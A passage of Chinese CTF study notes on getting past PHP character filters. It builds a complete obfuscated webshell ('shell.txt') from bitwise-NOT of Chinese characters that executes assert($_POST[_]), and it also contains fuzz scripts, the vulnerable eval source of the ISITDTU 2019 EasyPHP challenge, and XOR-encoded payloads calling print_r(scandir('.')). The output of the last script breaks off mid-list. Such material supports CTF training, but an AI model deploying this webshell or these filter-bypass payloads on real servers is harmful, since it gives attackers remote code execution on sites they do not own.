过滤字符:  V
过滤字符:  W
过滤字符:  X
过滤字符:  Y
过滤字符:  Z
该字符可以通过:  [
过滤字符:  \
该字符可以通过:  ]
过滤字符:  ^
该字符可以通过:  _
过滤字符:  `
过滤字符:  a
过滤字符:  b
过滤字符:  c
过滤字符:  d
过滤字符:  e
过滤字符:  f
过滤字符:  g
过滤字符:  h
过滤字符:  i
过滤字符:  j
过滤字符:  k
过滤字符:  l
过滤字符:  m
过滤字符:  n
过滤字符:  o
过滤字符:  p
过滤字符:  q
过滤字符:  r
过滤字符:  s
过滤字符:  t
过滤字符:  u
过滤字符:  v
过滤字符:  w
过滤字符:  x
过滤字符:  y
过滤字符:  z
过滤字符:  {
过滤字符:  |
过滤字符:  }
该字符可以通过:  ~

    可以通过的字符 ：
   $( ) . ; = [ ] _ ~ 汉字
一看有~可以取反  这里采用取反汉字
assert($_POST[_])

这里用到了一个非常好的思路
首先我们的索引1不能再以数字形式直接表示，会被过滤的，在PHP中，两个空数组进行比较会得到true，而true==1

例：
<?php

$a= []/"";
$b= []/"";
$c= ($a  == $b);
echo $c;
=> 1

所以这里可以把变量名改为_即可



```

汉字fuzz脚本

```php

<?php
//Author: m0c1nu7 
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');

function str_split_unicode($str, $l = 0) {
 
    if ($l > 0) {
        $ret = array();
        $len = mb_strlen($str, "UTF-8");
        for ($i = 0; $i < $len; $i += $l) {
            $ret[] = mb_substr($str, $i, $l, "UTF-8");
        }
        return $ret;
    }
    return preg_split("//u", $str, -1, PREG_SPLIT_NO_EMPTY);
}
 
$s = '你归来是诗离去成词且笑风尘不敢造次我糟糠能食粗衣也认煮酒话桑不敢相思你终会遇见这么一个人他会用整个人生将你精心收藏用漫长岁月把你妥善安放怕什么岁月漫长你心地善良,终会有一人陪你骑马喝酒走四方为你唱一首歌歌中有你亦有我我的泪我的魅将都融入到我的歌声里飘向孤独的你你是否听到了我的歌曲是否也在黯然落泪？岁月匆匆人生漫漫漠视了真情谁是站谁的谁已经变得不重要至少曾经已拥有长相思爱相随时空隔离谁相陪？花前月下心随风相思一片梦成空笑看往事红尘中多少凝思付清秋？长相思泪相随曾经谁是谁的谁？孤星冷月泪盈盈念曾经相逢心长时光短让人垂泪到天明长相思苦相随窗前双燕比翼飞日暮情人成双对于时光无垠的田野中没有早一步也没有晚一步恰好遇见了想要遇见的人这是一段多少美丽而令人心动的尘缘于爱情来说相见恨早会恨晚站会留下梨花带雨的疼痛而于友情来说无论太早或者太迟都是一份值得珍惜的情缘晚秋缓缓走晚了我的轮回疏雨一刻半疏笼起我深深的梦馀昨日遗憾寸寸疏雨挑涸泪烛落笔无处飒晚秋彼晚秋未晚懒我疏雨疏风去归我初心还我清梦唯我在晚秋未晚里守望那疏雨半疏的麦田待下一片梧桐叶复舞我亦拾起我的旧梦旧梦清寒一枕乱我眸中晚秋躞蹀的雨疏疏拍窗我的晚秋疏雨半疏疏开昨日我的梦情缘如海深邃澈蓝干涸成妄谈一湛清湖泪潸然一颦寒眉锁阑珊只为你而欣悦只因你而清泪斑斑你是我的前世吧为何沁泊在我的心怀缱绻起涟波千层驻我心扉知我情怀从此我已习惯你的嘘寒问暖懒倦地痴卧在你的胸怀红霞满腮昨天再苦都要用今天的微笑把它吟咏成一段幸福的记忆；曾经再累都要用当站下的遗忘穿越万道红尘让心波澜不惊人生最大的荣耀不在于从不跌倒而在于每一次跌倒后都能爬起来回忆是件很累的事就像失眠时怎么躺都不对的样子有时候往往直到离开在回忆里才能知道自己有多喜欢一座城';

$arr_str=str_split_unicode($s);

for ($i=0; $i < strlen($s) ; $i++) { 
	echo $arr_str[$i].' ------- '.~$arr_str[$i][1].'<br>';
}
 
 ?>




=》
你 ------- B<br>归 ------- B<br>来 ------- b<br>是 ------- g<br>诗 ------- P<br>离 ------- Y<br>去 ------- q<br>成 ------- w<br>词 ------- P<br>且 ------- G<br>笑 ------- S<br>风 ------- \<br>尘 ------- O<br>不 ------- G<br>敢 ------- j<br>造 ------- <br>次 ------- S<br>我 ------- w<br>糟 ------- L<br>糠 ------- L<br>能 ------- |<br>食 ------- \<br>粗 ------- M<br>衣 ------- ^<br>也 ------- F<br>认 ------- Q<br>煮 ------- z<br>酒 ------- z<br>话 ------- P<br>桑 ------- ^<br>
不 ------- G<br>敢 ------- j<br>相 ------- d<br>思 ------- <br>你 ------- B<br>终 ------- D<br>会 ------- C<br>遇 ------- ~<br>见 ------- X<br>这 ------- @<br>么 ------- F<br>一 ------- G<br>个 ------- G<br>人 ------- E<br>他 ------- D<br>
会 ------- C<br>用 ------- k<br>整 ------- j<br>个 ------- G<br>人 ------- E<br>生 ------- k<br>将 ------- O<br>你 ------- B<br>精 ------- M<br>心 ------- @<br>收 ------- k<br>藏 ------- h<br>用 ------- k<br>漫 ------- C<br>长 ------- j<br>岁 ------- M<br>月 ------- c<br>把 ------- u<br>你 ------- B<br>妥 ------- Y<br>善 ------- i<br>安 ------- Q<br>放 ------- k<br>怕 ------- <br>什 ------- D<br>么 ------- F<br>岁 ------- M<br>月 ------- c<br>漫 ------- C<br>长 ------- j<br>
你 ------- B<br>心 ------- @<br>地 ------- c<br>善 ------- i<br>良 ------- v<br>, ------- <br>终 ------- D<br>会 ------- C<br>有 ------- c<br>一 ------- G<br>人 ------- E<br>陪 ------- f<br>你 ------- B<br>骑 ------- U<br>马 ------- V<br>喝 ------- i<br>酒 ------- z<br>走 ------- J<br>四 ------- d<br>方 ------- i<br>为 ------- G<br>你 ------- B<br>唱 ------- k<br>一 ------- G<br>首 ------- Y<br>歌 ------- R<br>歌 ------- R<br>中 ------- G<br>有 ------- c<br>你 ------- B<br>亦 ------- E<br>有 ------- c<br>我 ------- w<br>我 ------- w<br>的 ------- e<br>泪 ------- L<br>我 ------- w<br>的 ------- e<br>魅 ------- R<br>将 ------- O<br>都 ------- |<br>融 ------- a<br>入 ------- z<br>到 ------- w<br>我 ------- w<br>的 ------- e<br>歌 ------- R<br>声 ------- \<br>里 ------- x<br>飘 ------- \<br>向 ------- o<br>孤 ------- R<br>独 ------- t<br>的 ------- e<br>你 ------- B<br>你 ------- B<br>是 ------- g<br>否 ------- o<br>听 ------- o<br>到 ------- w<br>了 ------- E<br>我 ------- w<br>的 ------- e<br>歌 ------- R<br>曲 ------- d<br>是 ------- g<br>否 ------- o<br>也 ------- F<br>在 ------- c<br>黯 ------- D<br>然 ------- {<br>落 ------- o<br>泪 ------- L<br>？ ------- C<br>岁 ------- M<br>月 ------- c<br>匆 ------- s<br>匆 ------- s<br>人 ------- E<br>生 ------- k<br>漫 ------- C<br>漫 ------- C<br>漠 ------- C<br>视 ------- X<br>了 ------- E<br>真 ------- c<br>情 ------- |<br>谁 ------- O<br>是 ------- g<br>站 ------- T<br>谁 ------- O<br>的 ------- e<br>谁 ------- O<br>已 ------- H<br>经 ------- D<br>变 ------- p<br>得 ------- A<br>不 ------- G<br>重 ------- x<br>要 ------- Y<br>至 ------- x<br>少 ------- O<br>曾 ------- d<br>经 ------- D<br>已 ------- H<br>拥 ------- t<br>有 ------- c<br>长 ------- j<br>相 ------- d<br>思 ------- <br>爱 ------- w<br>相 ------- d<br>随 ------- e<br>时 ------- h<br>空 ------- V<br>隔 ------- e<br>离 ------- Y<br>谁 ------- O<br>相 ------- d<br>陪 ------- f<br>？ ------- C<br>花 ------- u<br>前 ------- v<br>月 ------- c<br>下 ------- G<br>心 ------- @<br>随 ------- e<br>风 ------- \<br>相 ------- d<br>思 ------- <br>一 ------- G<br>片 ------- v<br>梦 ------- ]<br>成 ------- w<br>空 ------- V<br>笑 ------- S<br>看 ------- c<br>往 ------- A<br>事 ------- E<br>红 ------- E<br>尘 ------- O<br>中 ------- G<br>多 ------- [<br>少 ------- O<br>凝 ------- x<br>思 ------- <br>付 ------- D<br>清 ------- G<br>秋 ------- X<br>？ ------- C<br>长 ------- j<br>相 ------- d<br>思 ------- <br>泪 ------- L<br>相 ------- d<br>随 ------- e<br>曾 ------- d<br>经 ------- D<br>谁 ------- O<br>是 ------- g<br>谁 ------- O<br>的 ------- e<br>谁 ------- O<br>？ ------- C<br>孤 ------- R<br>星 ------- g<br>冷 ------- y<br>月 ------- c<br>泪 ------- L<br>盈 ------- d<br>盈 ------- d<br>念 ------- @<br>曾 ------- d<br>经 ------- D<br>相 ------- d<br>逢 ------- <br>心 ------- @<br>长 ------- j<br>时 ------- h<br>光 ------- z<br>短 ------- `<br>让 ------- Q<br>人 ------- E<br>垂 ------- a<br>泪 ------- L<br>到 ------- w<br>天 ------- [<br>明 ------- g<br>长 ------- j<br>相 ------- d<br>思 ------- <br>苦 ------- t<br>相 ------- d<br>随 ------- e<br>窗 ------- U<br>前 ------- v<br>双 ------- p<br>燕 ------- x<br>比 ------- P<br>翼 ------- @<br>飞 ------- \<br>日 ------- h<br>暮 ------- e<br>情 ------- |<br>人 ------- E<br>成 ------- w<br>双 ------- p<br>对 ------- P<br>于 ------- E<br>时 ------- h<br>光 ------- z<br>无 ------- h<br>垠 ------- a<br>的 ------- e<br>田 ------- k<br>野 ------- x<br>中 ------- G<br>没 ------- M<br>有 ------- c<br>早 ------- h<br>一 ------- G<br>步 ------- R<br>也 ------- F<br>没 ------- M<br>有 ------- c<br>晚 ------- f<br>一 ------- G<br>步 ------- R<br>恰 ------- ~<br>好 ------- Z<br>遇 ------- ~<br>见 ------- X<br>了 ------- E<br>想 ------- |<br>要 ------- Y<br>遇 ------- ~<br>见 ------- X<br>的 ------- e<br>人 ------- E<br>这 ------- @<br>是 ------- g<br>一 ------- G<br>段 ------- Q<br>多 ------- [<br>少 ------- O<br>美 ------- A<br>丽 ------- G<br>而 ------- <br> 令 ------- D<br>人 ------- E<br>心 ------- @<br>动 ------- u<br>的 ------- e<br>尘 ------- O<br>缘 ------- C<br>于 ------- E<br>爱 ------- w<br>情 ------- |<br>来 ------- b<br>说 ------- P<br>相 ------- d<br>见 ------- X<br>恨 ------- ~<br>早 ------- h<br>会 ------- C<br>恨 ------- ~<br>晚 ------- f<br>站 ------- T<br>会 ------- C<br>留 ------- j<br>下 ------- G<br>梨 ------- ]<br>花 ------- u<br>带 ------- G<br>雨 ------- d<br>的 ------- e<br>疼 ------- i<br>痛 ------- h<br>而 ------- <br>于 ------- E<br>友 ------- p<br>情 ------- |<br>来 ------- b<br>说 ------- P<br>无 ------- h<br>论 ------- Q<br>太 ------- [<br>早 ------- h<br>或 ------- w<br>者 ------- <br>太 ------- [<br>迟 ------- @<br>都 ------- |<br>是 ------- g<br>一 ------- G<br>份 ------- D<br>值 ------- <br>得 ------- A<br>珍 ------- p<br>惜 ------- |<br>的 ------- e<br>情 ------- |<br>缘 ------- C<br>晚 ------- f<br>秋 ------- X<br>缓 ------- C<br>缓 ------- C<br>走 ------- J<br>晚 ------- f<br>了 ------- E<br>我 ------- w<br>的 ------- e<br>轮 ------- B<br>回 ------- d<br>疏 ------- i<br>雨 ------- d<br>一 ------- G<br>刻 ------- w<br>半 ------- r<br>疏 ------- i<br>笼 ------- S<br>起 ------- J<br>我 ------- w<br>深 ------- H<br>深 ------- H<br>的 ------- e<br>梦 ------- ]<br>馀 ------- Y<br>昨 ------- g<br>日 ------- h<br>遗 ------- ~<br>憾 ------- y<br>寸 ------- P<br>寸 ------- P<br>疏 ------- i<br>雨 ------- d<br>挑 ------- s<br>涸 ------- I<br>泪 ------- L<br>烛 ------- |<br>落 ------- o<br>笔 ------- S<br>无 ------- h<br>处 ------- [<br>飒 ------- \<br>晚 ------- f<br>秋 ------- X<br>彼 ------- B<br>晚 ------- f<br>秋 ------- X<br>未 ------- c<br>晚 ------- f<br>懒 ------- x<br>我 ------- w<br>疏 ------- i<br>雨 ------- d<br>疏 ------- i<br>风 ------- \<br>去 ------- q<br>归 ------- B<br>我 ------- w<br>初 ------- w<br>心 ------- @<br>还 ------- @<br>我 ------- w<br>清 ------- G<br>梦 ------- ]<br>唯 ------- k<br>我 ------- w<br>在 ------- c<br>晚 ------- f<br>秋 ------- X<br>未 ------- c<br>晚 ------- f<br>里 ------- x<br>守 ------- Q<br>望 ------- c<br>那 ------- }<br>疏 ------- i<br>雨 ------- d<br>半 ------- r<br>疏 ------- i<br>的 ------- e<br>麦 ------- E<br>田 ------- k<br>待 ------- A<br>下 ------- G<br>一 ------- G<br>片 ------- v<br>梧 ------- ]<br>桐 ------- ^<br>叶 ------- p<br>复 ------- [<br>舞 ------- w<br>我 ------- w<br>亦 ------- E<br>拾 ------- t<br>起 ------- J<br>我 ------- w<br>的 ------- e<br>旧 ------- h<br>梦 ------- ]<br>旧 ------- h<br>梦 ------- ]<br>清 ------- G<br>寒 ------- P<br>一 ------- G<br>枕 ------- a<br>乱 ------- F<br>我 ------- w<br>眸 ------- c<br>中 ------- G<br>晚 ------- f<br>秋 ------- X<br>躞 ------- E<br>蹀 ------- F<br>的 ------- e<br>雨 ------- d<br>疏 ------- i<br>疏 ------- i<br>拍 ------- t<br>窗 ------- U<br>我 ------- w<br>的 ------- e<br>晚 ------- f<br>秋 ------- X<br>疏 ------- i<br>雨 ------- d<br>半 ------- r<br>疏 ------- i<br>疏 ------- i<br>开 ------- C<br>昨 ------- g<br>日 ------- h<br>我 ------- w<br>的 ------- e<br>梦 ------- ]<br>情 ------- |<br>缘 ------- C<br>如 ------- Y<br>海 ------- J<br>深 ------- H<br>邃 ------- }<br>澈 ------- A<br>蓝 ------- l<br>干 ------- F<br>涸 ------- I<br>成 ------- w<br>妄 ------- Y<br>谈 ------- O<br>一 ------- G<br>湛 ------- F<br>清 ------- G<br>湖 ------- F<br>泪 ------- L<br>潸 ------- B<br>然 ------- {<br>一 ------- G<br>颦 ------- ]<br>寒 ------- P<br>眉 ------- c<br>锁 ------- k<br>阑 ------- g<br>珊 ------- p<br>只 ------- p<br>为 ------- G<br>你 ------- B<br>而 ------- <br>欣 ------- S<br>悦 ------- }<br>只 ------- p<br>因 ------- d<br>你 ------- B<br>而 ------- <br>清 ------- G<br>泪 ------- L<br>斑 ------- i<br>斑 ------- i<br>你 ------- B<br>是 ------- g<br>我 ------- w<br>的 ------- e<br>前 ------- v<br>世 ------- G<br>吧 ------- o<br>为 ------- G<br>何 ------- B<br>沁 ------- M<br>泊 ------- L<br> 在 ------- c<br>我 ------- w<br>的 ------- e<br>心 ------- @<br>怀 ------- <br>缱 ------- C<br>绻 ------- D<br>起 ------- J<br>涟 ------- I<br>波 ------- L<br>千 ------- r<br>层 ------- N<br>驻 ------- V<br>我 ------- w<br>心 ------- @<br>扉 ------- v<br>知 ------- `<br>我 ------- w<br>情 ------- |<br>怀 ------- <br>从 ------- D<br>此 ------- R<br>我 ------- w<br>已 ------- H<br>习 ------- F<br>惯 ------- |<br>你 ------- B<br>的 ------- e<br>嘘 ------- g<br>寒 ------- P<br>问 ------- h<br>暖 ------- e<br>懒 ------- x<br>倦 ------- <br>地 ------- c<br>痴 ------- h<br>卧 ------- r<br>在 ------- c<br>你 ------- B<br>的 ------- e<br>胸 ------- |<br>怀 ------- <br>红 ------- E<br>霞 ------- c<br>满 ------- D<br>腮 ------- z<br>昨 ------- g<br>天 ------- [<br>再 ------- y<br>苦 ------- t<br>都 ------- |<br>要 ------- Y<br> 用 ------- k<br>今 ------- D<br>天 ------- [<br>的 ------- e<br>微 ------- A<br>笑 ------- S<br>把 ------- u<br>它 ------- Q<br>吟 ------- o<br>咏 ------- m<br>成 ------- w<br>一 ------- G<br>段 ------- Q<br>幸 ------- F<br>福 ------- Y<br>的 ------- e<br>记 ------- Q<br>忆 ------- @<br>； ------- C<br>曾 ------- d<br>经 ------- D<br>再 ------- y<br>累 ------- K<br>都 ------- |<br>要 ------- Y<br>用 ------- k<br>当 ------- B<br>站 ------- T<br>下 ------- G<br>的 ------- e<br>遗 ------- ~<br>忘 ------- @<br>穿 ------- V<br>越 ------- I<br>万 ------- G<br>道 ------- ~<br>红 ------- E<br>尘 ------- O<br>让 ------- Q<br>心 ------- @<br>波 ------- L<br>澜 ------- A<br>不 ------- G<br>惊 ------- |<br>人 ------- E<br>生 ------- k<br>最 ------- c<br>大 ------- [<br>的 ------- e<br>荣 ------- r<br>耀 ------- <br>不 ------- G<br>在 ------- c<br>于 ------- E<br>从 ------- D<br>不 ------- G<br>跌 ------- H<br>倒 ------- <br>而 ------- <br>在 ------- c<br>于 ------- E<br>每 ------- P<br>一 ------- G<br>次 ------- S<br>跌 ------- H<br>倒 ------- <br>后 ------- o<br>都 ------- |<br>能 ------- |<br>爬 ------- w<br>起 ------- J<br>来 ------- b<br>回 ------- d<br>忆 ------- @<br>是 ------- g<br>件 ------- D<br>很 ------- A<br>累 ------- K<br>的 ------- e<br>事 ------- E<br>就 ------- O<br>像 ------- |<br>失 ------- [<br>眠 ------- c<br>时 ------- h<br>怎 ------- <br>么 ------- F<br>躺 ------- E<br>都 ------- |<br>不 ------- G<br>对 ------- P<br>的 ------- e<br>样 ------- _<br>子 ------- R<br>有 ------- c<br>时 ------- h<br>候 ------- <br>往 ------- A<br>往 ------- A<br>直 ------- d<br>到 ------- w<br>离 ------- Y<br>开 ------- C<br>在 ------- c<br>回 ------- d<br>忆 ------- @<br>里 ------- x<br>才 ------- v<br>能 ------- |<br>知 ------- `<br>道 ------- ~<br>自 ------- x<br>己 ------- H<br>有 ------- c<br>多 ------- [<br>喜 ------- i<br>欢 ------- S<br>一 ------- G<br>座 ------- E<br> 城 ------- `<br>
```

```php
示例：
    <?php
    $a = ~'垂';
  echo $a[1];
=>a



<?php

$__ = [];
$_ = ($__ == $__);//$_ = 1

$__ = ~(融);
$___ = $__[$_];//a
$__ = ~(匆);
$___ .=$__[$_].$__[$_];//ass
$__ = ~(随);
$___ = $__[$_];//asse
$__ = ~(千);
$___ .= $__[$_];//asser
$__ = ~(苦);
$___ .= $__[$_];//assert

$____ = ~(~(_));//_
$__ = ~(诗);
$____ .= $__[$_];//_P
$__ = ~(尘);
$____ .= $__[$_];//_PO
$__ = ~(欣);
$____ .= $__[$_];//_POS
$__ = ~(站);
$____ .= $__[$_];//_POST

$_=$$____;//$_POST
$___($_[_]);//assert($_POST[_])

真正的shell文件需要删掉空格和过滤
 
//shell.txt
<?php
$__=[];
$_=($__==$__);
$__=~(融);
$___=$__[$_];
$__=~(匆);
$___.=$__[$_].$__[$_];
$__=~(随);
$___.=$__[$_];
$__=~(千);
$___.=$__[$_];
$__=~(苦);
$___.=$__[$_];
$____=~(~(_));
$__=~(诗);
$____.=$__[$_];
$__=~(尘);
$____.=$__[$_];
$__=~(欣);
$____.=$__[$_];
$__=~(站);
$____.=$__[$_];
$_=$$____;
$___($_[_]);

    
    
    


```

这题出现了问题 没有查到flag  但是phpinfo(); 确实是成功了

## 3.15



命令执行必看的p神文章

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

### [ISITDTU 2019]EasyPHP

```php
<?php
highlight_file(__FILE__);

$_ = @$_GET['_'];
if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
    die('rosé will not do it');

if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');

eval($_);
?>
```

查看下有哪些能用的字符

```php
<?php
for($i=0;$i<=127;$i++){
    if ( !preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i',chr($i)) ){
        echo chr($i);
    }
}
?>


=>

!#%()*+-/:;<=>?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~
```

第二个if

count_chars

返回字符串所用的字符的数量

限制了字符的**种类**不能超过13种

用取反拼出phpinfo();可以执行

```
disable_functions 
	pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,
```

放出来了  print_r  和 scandir()

想到无参rce

```php
print_r(scandir('.'));

<?php 
$_ = "print_r(scandir('.'));"
echo strlen(count_chars(strtolower($_), 0x3));

=>
15


    
print_r 异或表示:
<?php
    echo urlencode('print_r' ^ urldecode('%FF%FF%FF%FF%FF%FF%FF'));

=>
    %8F%8D%96%91%8B%A0%8D^%ff%ff%ff%ff%ff%ff%ff
    
    scandir(.)  异或表示:
<?php
$a = urlencode(('scandir') ^ urldecode('%ff%ff%ff%ff%ff%ff%ff'));

$b = urlencode('.' ^ urldecode('%ff'));

echo $a.'^%ff%ff%ff%ff%ff%ff%ff'.'('.$b.'^%ff'.')';

=>
    %8C%9C%9E%91%9B%96%8D^%ff%ff%ff%ff%ff%ff%ff(%D1^%ff)
    
    
合起来：
    ((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));


```



尝试缩短paylaod

直接上大佬脚本

```python
result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original chars,11 total
result = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c]  # to be deleted
temp = []
for d in result2:
    for a in result:
        for b in result:
            for c in result:
                if (a ^ b ^ c == d):
                    if a == b == c == d:
                        continue
                    else:
                        print("a=0x%x,b=0x%x,c=0x%x,d=0x%x" % (a, b, c, d))
                        if d not in temp:
                            temp.append(d)
print(len(temp), temp)



=>
a=0x9b,b=0x9c,c=0x8c,d=0x8b
a=0x9b,b=0x8c,c=0x9c,d=0x8b
a=0x9c,b=0x9b,c=0x8c,d=0x8b
a=0x9c,b=0x8c,c=0x9b,d=0x8b
a=0x8c,b=0x9b,c=0x9c,d=0x8b
a=0x8c,b=0x9c,c=0x9b,d=0x8b
a=0x9b,b=0xa0,c=0xa0,d=0x9b
a=0x9b,b=0x9c,c=0x9c,d=0x9b
a=0x9b,b=0x8f,c=0x8f,d=0x9b
a=0x9b,b=0x9e,c=0x9e,d=0x9b
a=0x9b,b=0xd1,c=0xd1,d=0x9b
a=0x9b,b=0x96,c=0x96,d=0x9b
a=0x9b,b=0x8c,c=0x8c,d=0x9b
a=0xa0,b=0x9b,c=0xa0,d=0x9b
a=0xa0,b=0xa0,c=0x9b,d=0x9b
a=0x9c,b=0x9b,c=0x9c,d=0x9b
a=0x9c,b=0x9c,c=0x9b,d=0x9b
a=0x8f,b=0x9b,c=0x8f,d=0x9b
a=0x8f,b=0x8f,c=0x9b,d=0x9b
a=0x9e,b=0x9b,c=0x9e,d=0x9b
a=0x9e,b=0x9e,c=0x9b,d=0x9b
a=0xd1,b=0x9b,c=0xd1,d=0x9b
a=0xd1,b=0xd1,c=0x9b,d=0x9b
a=0x96,b=0x9b,c=0x96,d=0x9b
a=0x96,b=0x96,c=0x9b,d=0x9b
a=0x8c,b=0x9b,c=0x8c,d=0x9b
a=0x8c,b=0x8c,c=0x9b,d=0x9b
a=0x9b,b=0x9b,c=0xa0,d=0xa0
a=0x9b,b=0xa0,c=0x9b,d=0xa0
a=0xa0,b=0x9b,c=0x9b,d=0xa0
a=0xa0,b=0x9c,c=0x9c,d=0xa0
a=0xa0,b=0x8f,c=0x8f,d=0xa0
a=0xa0,b=0x9e,c=0x9e,d=0xa0
a=0xa0,b=0xd1,c=0xd1,d=0xa0
a=0xa0,b=0x96,c=0x96,d=0xa0
a=0xa0,b=0x8c,c=0x8c,d=0xa0
a=0x9c,b=0xa0,c=0x9c,d=0xa0
a=0x9c,b=0x9c,c=0xa0,d=0xa0
a=0x8f,b=0xa0,c=0x8f,d=0xa0
a=0x8f,b=0x8f,c=0xa0,d=0xa0
a=0x9e,b=0xa0,c=0x9e,d=0xa0
a=0x9e,b=0x9e,c=0xa0,d=0xa0
a=0xd1,b=0xa0,c=0xd1,d=0xa0
a=0xd1,b=0xd1,c=0xa0,d=0xa0
a=0x96,b=0xa0,c=0x96,d=0xa0
a=0x96,b=0x96,c=0xa0,d=0xa0
a=0x8c,b=0xa0,c=0x8c,d=0xa0
a=0x8c,b=0x8c,c=0xa0,d=0xa0
a=0x9b,b=0x9b,c=0x9c,d=0x9c
a=0x9b,b=0x9c,c=0x9b,d=0x9c
a=0xa0,b=0xa0,c=0x9c,d=0x9c
a=0xa0,b=0x9c,c=0xa0,d=0x9c
a=0x9c,b=0x9b,c=0x9b,d=0x9c
a=0x9c,b=0xa0,c=0xa0,d=0x9c
a=0x9c,b=0x8f,c=0x8f,d=0x9c
a=0x9c,b=0x9e,c=0x9e,d=0x9c
a=0x9c,b=0xd1,c=0xd1,d=0x9c
a=0x9c,b=0x96,c=0x96,d=0x9c
a=0x9c,b=0x8c,c=0x8c,d=0x9c
a=0x8f,b=0x9c,c=0x8f,d=0x9c
a=0x8f,b=0x8f,c=0x9c,d=0x9c
a=0x9e,b=0x9c,c=0x9e,d=0x9c
a=0x9e,b=0x9e,c=0x9c,d=0x9c
a=0xd1,b=0x9c,c=0xd1,d=0x9c
a=0xd1,b=0xd1,c=0x9c,d=0x9c
a=0x96,b=0x9c,c=0x96,d=0x9c
a=0x96,b=0x96,c=0x9c,d=0x9c
a=0x8c,b=0x9c,c=0x8c,d=0x9c
a=0x8c,b=0x8c,c=0x9c,d=0x9c
a=0x9b,b=0x9b,c=0x8f,d=0x8f
a=0x9b,b=0x8f,c=0x9b,d=0x8f
a=0xa0,b=0xa0,c=0x8f,d=0x8f
a=0xa0,b=0x8f,c=0xa0,d=0x8f
a=0x9c,b=0x9c,c=0x8f,d=0x8f
a=0x9c,b=0x8f,c=0x9c,d=0x8f
a=0x8f,b=0x9b,c=0x9b,d=0x8f
a=0x8f,b=0xa0,c=0xa0,d=0x8f
a=0x8f,b=0x9c,c=0x9c,d=0x8f
a=0x8f,b=0x9e,c=0x9e,d=0x8f
a=0x8f,b=0xd1,c=0xd1,d=0x8f
a=0x8f,b=0x96,c=0x96,d=0x8f
a=0x8f,b=0x8c,c=0x8c,d=0x8f
a=0x9e,b=0x8f,c=0x9e,d=0x8f
a=0x9e,b=0x9e,c=0x8f,d=0x8f
a=0xd1,b=0x8f,c=0xd1,d=0x8f
a=0xd1,b=0xd1,c=0x8f,d=0x8f
a=0x96,b=0x8f,c=0x96,d=0x8f
a=0x96,b=0x96,c=0x8f,d=0x8f
a=0x8c,b=0x8f,c=0x8c,d=0x8f
a=0x8c,b=0x8c,c=0x8f,d=0x8f
a=0x9b,b=0x9c,c=0x96,d=0x91
a=0x9b,b=0x96,c=0x9c,d=0x91
a=0x9c,b=0x9b,c=0x96,d=0x91
a=0x9c,b=0x96,c=0x9b,d=0x91
a=0x96,b=0x9b,c=0x9c,d=0x91
a=0x96,b=0x9c,c=0x9b,d=0x91
a=0x9b,b=0x9b,c=0x9e,d=0x9e
a=0x9b,b=0x9e,c=0x9b,d=0x9e
a=0xa0,b=0xa0,c=0x9e,d=0x9e
a=0xa0,b=0x9e,c=0xa0,d=0x9e
a=0x9c,b=0x9c,c=0x9e,d=0x9e
a=0x9c,b=0x9e,c=0x9c,d=0x9e
a=0x8f,b=0x8f,c=0x9e,d=0x9e
a=0x8f,b=0x9e,c=0x8f,d=0x9e
a=0x9e,b=0x9b,c=0x9b,d=0x9e
a=0x9e,b=0xa0,c=0xa0,d=0x9e
a=0x9e,b=0x9c,c=0x9c,d=0x9e
a=0x9e,b=0x8f,c=0x8f,d=0x9e
a=0x9e,b=0xd1,c=0xd1,d=0x9e
a=0x9e,b=0x96,c=0x96,d=0x9e
a=0x9e,b=0x8c,c=0x8c,d=0x9e
a=0xd1,b=0x9e,c=0xd1,d=0x9e
a=0xd1,b=0xd1,c=0x9e,d=0x9e
a=0x96,b=0x9e,c=0x96,d=0x9e
a=0x96,b=0x96,c=0x9e,d=0x9e
a=0x8c,b=0x9e,c=0x8c,d=0x9e
a=0x8c,b=0x8c,c=0x9e,d=0x9e
a=0x9b,b=0x9b,c=0xd1,d=0xd1
a=0x9b,b=0xd1,c=0x9b,d=0xd1
a=0xa0,b=0xa0,c=0xd1,d=0xd1
a=0xa0,b=0xd1,c=0xa0,d=0xd1
a=0x9c,b=0x9c,c=0xd1,d=0xd1
a=0x9c,b=0xd1,c=0x9c,d=0xd1
a=0x8f,b=0x8f,c=0xd1,d=0xd1
a=0x8f,b=0xd1,c=0x8f,d=0xd1
a=0x9e,b=0x9e,c=0xd1,d=0xd1
a=0x9e,b=0xd1,c=0x9e,d=0xd1
a=0xd1,b=0x9b,c=0x9b,d=0xd1
a=0xd1,b=0xa0,c=0xa0,d=0xd1
a=0xd1,b=0x9c,c=0x9c,d=0xd1
a=0xd1,b=0x8f,c=0x8f,d=0xd1
a=0xd1,b=0x9e,c=0x9e,d=0xd1
a=0xd1,b=0x96,c=0x96,d=0xd1
a=0xd1,b=0x8c,c=0x8c,d=0xd1
a=0x96,b=0xd1,c=0x96,d=0xd1
a=0x96,b=0x96,c=0xd1,d=0xd1
a=0x8c,b=0xd1,c=0x8c,d=0xd1
a=0x8c,b=0x8c,c=0xd1,d=0xd1
a=0x9b,b=0x9b,c=0x96,d=0x96
a=0x9b,b=0x96,c=0x9b,d=0x96
a=0xa0,b=0xa0,c=0x96,d=0x96
a=0xa0,b=0x96,c=0xa0,d=0x96
a=0x9c,b=0x9c,c=0x96,d=0x96
